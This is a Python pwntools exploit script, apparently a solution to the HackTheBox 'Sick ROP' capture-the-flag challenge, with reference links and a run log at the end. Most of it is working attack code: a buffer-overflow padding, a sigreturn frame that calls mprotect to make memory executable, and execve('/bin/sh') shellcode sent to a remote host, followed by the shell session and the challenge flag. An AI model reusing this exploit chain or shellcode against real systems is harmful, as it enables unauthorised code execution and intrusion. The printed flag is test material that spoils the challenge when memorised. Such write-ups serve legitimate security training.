'''
### SROP ###
### Sigreturn ROP ###

https://corruptedprotocol.medium.com/sickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441

https://shakuganz.com/2022/07/11/hackthebox-sick-rop-write-up/
https://fdlucifer.github.io/2021/01/11/sick-rop/

'''

from pwn import *

ip,port = "68.183.47.198",32383
#io = process('./sick_rop')
io = remote(ip, port)

context.arch = 'amd64'

elf = ELF('./sick_rop')

#set the value of RAX, we don't have POP RAX; RET here...
def set_rax(num):
	# need to -1 as '\n' will also be counted in read()
	io.sendline('A'*(num-1))
	io.recv()

OFFSET_TO_RET = 0x20+0x08
padding = 'A'*OFFSET_TO_RET

# ROPgadget --binary ./sick_rop --only "syscall"
syscall_addr = 0x401014
# the address of vuln function in symtab
# pwndbg> search -p 0x40102E
vuln_ptr = 0x4010d8


shellcode =  """nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		mov rdi, 0x68732f6e69622f
                push rdi
                mov rdi, rsp
                mov rax, 0x3b
                xor rsi, rsi
                xor rdx, rdx
                syscall"""
assembled_shellcode = asm(shellcode)

frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = 0x400000   #start of the virtual address
frame.rsi = 0x10000    #length
frame.rdx = 7	       #permission rwx
frame.rsp = vuln_ptr
frame.rip = syscall_addr

# p64(binary.symbols['vuln']) is to set RAX to call SYS_sigreturn.
payload = padding + p64(elf.symbols['vuln']) + p64(syscall_addr) + str(frame)

io.sendline(payload)
io.recv()
set_rax(0xf)    #0xf -> call rt_sigreturn

payload = padding + p64(vuln_ptr+0x20) + assembled_shellcode
io.sendline(payload)
io.recv()
io.interactive()

'''
root@szhan21-mobl1:~/github/htb/ctf/pwn/SickROP# python2 dec.py
[+] Opening connection to 68.183.47.198 on port 32383: Done
[*] '/root/github/htb/ctf/pwn/SickROP/sick_rop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
$ ls
$ ls
flag.txt
run_challenge.sh
sick_rop
flag.txt
run_challenge.sh
sick_rop
$ cat flag.txt
HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
$

'''
